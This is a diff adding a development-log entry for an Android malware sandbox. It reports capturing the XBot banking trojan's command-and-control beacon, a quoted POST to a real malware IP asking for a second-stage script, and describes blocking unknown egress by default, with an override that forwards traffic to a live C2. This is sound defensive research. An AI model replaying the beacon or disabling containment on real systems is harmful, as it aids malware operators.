@@ -311,3 +311,72 @@ payload fire," which needs sample-specific reverse engineering (check
 `L1/artifacts/.../analysis.json` or jadx output for what the SUBMIT handler
 actually does, what response shape it expects) rather than a general
 automation fix.
+
+---
+
+## 2026-08-26 — First non-zero behavioural capture: XBot beacons its C2 on launch
+
+The SBI sample's payload gates behind a form submit that no run this session
+reached, so every prior L2 detonation this file records ended `findings=0` /
+attach-only `frida_hooks.jsonl`. A different sample settles whether the L2
+*pipeline itself* can catch a real malicious behaviour: the XBot banking
+trojan (`corpus/malware_raw/android-malware/xbot/1264C25D…F61F23.apk`, package
+`org.merry.core`), detonated through `L2/sandbox/orchestrator.py`.
+
+**Result — a real C2 beacon, captured, on launch (no UI interaction).** XBot
+carries a `BOOT_COMPLETED` receiver, so its command-fetch fires the moment the
+app starts — no SUBMIT handler to reverse. `L2/sandbox/artifacts/org.merry.core/network_evidence.json`
+records the beacon:
+
+```
+POST http://192.227.137.154/request.php
+Content-Type: application/x-www-form-urlencoded
+data=eyJuYW1lIjoiYm9vdFNjcmlwdE5ldCIsImFjdGlvbiI6ImdldF9zY3JpcHQifQ%3D%3D
+```
+
+The `data=` form field base64-decodes to
+`{"name":"bootScriptNet","action":"get_script"}` — a dropper "fetch second-stage
+script" C2 command. This is the **first** non-zero behavioural capture from any
+L2 run: the layer's networking path (mitmproxy → `network_evidence.json`)
+demonstrably records real malware traffic, not just a clean attach.
+
+**Egress was contained, not observed.** The run coincided with `mitm_addon.py`
+being hardened (see below): all **9** outbound requests — the C2 POST plus OS
+connectivity checks to `connectivitycheck.gstatic.com` / `www.google.com` /
+`play.googleapis.com` — are tagged `blocked: true`, answered locally with
+`200 {}` and never forwarded. XBot's POST to a malware IP (`192.227.137.154`)
+was blocked instead of reaching the real C2.
+
+### `mitm_addon.py` hardened: contain unknown egress by default
+
+Previously the addon *observed* only — `request()` logged, `response()` faked
+replies for known bank/UPI/Firebase/Telegram hosts, and any **other** host's
+HTTP(S) was forwarded to the real internet (a genuine egress leak: XBot's C2
+POST would have gone out). Now all decisions happen in `request()`:
+
+- Known honeypot endpoints get their canned fake via the new
+  `_honeypot_response()` helper (moved out of the old `response()` hook, which
+  is gone — the fake is purely request-derived, so it never needed the upstream
+  reply).
+- Every other host is **BLOCKED by default** — answered locally with `200 {}`,
+  tagged `blocked: true`, never forwarded.
+- New `SENTINEL_MITM_BLOCK_UNKNOWN=0` env override (and `__init__` param
+  `block_unknown`) restores the old forward-and-observe behaviour when an
+  analyst deliberately wants a sample's traffic to reach a live C2.
+
+Reported: 40/40 L2-related tests pass (not re-run for this log entry).
+
+### Remaining L2 gaps (do not read this as "L2 complete")
+
+- **Containment vs observation.** Blocking an unknown C2 means the sample gets
+  no command back, so deeper stages (SMS theft, overlay) never fire. To observe
+  them you must fake a plausible C2 response — the tradeoff `SENTINEL_MITM_BLOCK_UNKNOWN=0`
+  exposes, not something the default resolves.
+- **Incoming-SMS hook missing.** The Frida pack hooks *outgoing*
+  `sendTextMessage`, but XBot-style SMS theft is on *incoming* SMS (a broadcast
+  receiver / `SmsMessage.createFromPdu`). That hook does not exist yet.
+- **Form-field base64 not auto-decoded.** `mitm_addon._decode_base64_payload`
+  only decodes raw-JSON bodies, so the `data=<base64>` **form-field** beacon was
+  not auto-decoded/flagged (decoded here by hand).
+- **The two known code bugs still stand** — `honeypot.seed_contacts()` binds no
+  name/number; `l2_engine.process()` globs all `L2/sandbox/artifacts/*` dirs.
